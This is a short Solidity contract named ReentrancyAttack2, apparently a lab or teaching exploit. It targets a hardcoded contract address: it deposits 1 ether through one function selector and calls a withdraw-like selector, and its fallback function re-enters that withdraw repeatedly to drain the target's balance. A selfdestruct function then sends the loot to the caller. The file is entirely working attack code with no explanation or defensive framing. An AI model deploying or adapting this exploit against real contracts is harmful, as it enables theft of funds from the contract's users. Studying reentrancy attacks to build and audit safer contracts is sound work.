pragma solidity ^0.5.0;

contract ReentrancyAttack2 {
    
    address _reentrancy = 0x0DCd2F752394c41875e259e00bb44fd505297caF;
    bytes4 selector1 = 0x5218195a;
    bytes4 selector2 = 0x7362377b;

    constructor () public {}
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
    
    function attack() public payable {
        
        bytes memory data = abi.encodeWithSelector(selector1);
        
        (bool success, ) = address(_reentrancy).call.value(1 ether)(data);
        require(success);

        bytes memory data2 = abi.encodeWithSelector(selector2);
        (bool success2, ) = address(_reentrancy).call(data2);
        require(success2);

    }
    
    function kill() public{
        selfdestruct(msg.sender);
    }
    
    function () external payable {
        if (address(_reentrancy).balance >= msg.value) {
            bytes memory data2 = abi.encodeWithSelector(selector2);
            (bool success2, ) = address(_reentrancy).call(data2);
            require(success2);
        }
    }
}
